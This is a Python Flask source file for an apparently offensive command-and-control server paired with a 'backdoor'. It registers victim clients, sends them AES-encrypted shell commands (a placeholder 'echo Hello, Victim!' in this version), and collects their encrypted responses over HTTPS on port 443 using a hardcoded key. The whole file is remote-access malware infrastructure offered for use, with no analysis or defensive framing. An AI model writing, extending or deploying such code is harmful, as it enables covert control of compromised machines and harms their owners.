import os
import hashlib
import base64
from flask import Flask, request, jsonify
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import uuid

app = Flask(__name__)

# Configuration
AES_KEY = hashlib.sha256(b"EynDnmNF4fipxGmiErq0hMOC-lXBuBxgRhIAHQDM8XA").digest()  # Same AES key as backdoor
clients = {}

# AES encryption and decryption functions
def encrypt_response(response):
    iv = os.urandom(16)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    encrypted_data = cipher.encrypt(pad(response.encode(), AES.block_size))
    return base64.b64encode(iv + encrypted_data).decode()

def decrypt_command(data):
    data = base64.b64decode(data)
    iv = data[:16]
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(data[16:]), AES.block_size).decode()
    return decrypted_data

@app.route('/register', methods=['POST'])
def register_client():
    data = request.json
    client_id = data.get('client_id')
    if client_id:
        clients[client_id] = {'status': 'registered'}
        return jsonify({'status': 'registered'}), 200
    return jsonify({'status': 'error', 'message': 'client_id is required'}), 400

@app.route('/check/<client_id>', methods=['GET'])
def check_for_commands(client_id):
    if client_id in clients:
        # Here we could create commands dynamically, but for now, we send a simple shell command.
        command = 'echo Hello, Victim!'
        encrypted_command = encrypt_response(command)
        return jsonify({'command': encrypted_command}), 200
    return jsonify({'status': 'error', 'message': 'client not found'}), 404

@app.route('/command/<client_id>', methods=['POST'])
def receive_command(client_id):
    data = request.json
    encrypted_command = data.get('command')
    if encrypted_command:
        try:
            command = decrypt_command(encrypted_command)
            # In a real implementation, you would execute the command here.
            print(f"Received command: {command}")
            return jsonify({'status': 'received'}), 200
        except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500
    return jsonify({'status': 'error', 'message': 'command is required'}), 400

@app.route('/response/<client_id>', methods=['POST'])
def receive_response(client_id):
    data = request.json
    encrypted_response = data.get('response')
    if encrypted_response:
        try:
            response = decrypt_command(encrypted_response)
            print(f"Received response: {response}")
            return jsonify({'status': 'received'}), 200
        except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500
    return jsonify({'status': 'error', 'message': 'response is required'}), 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=443, ssl_context='adhoc')  # Using HTTPS (SSL/TLS) by default
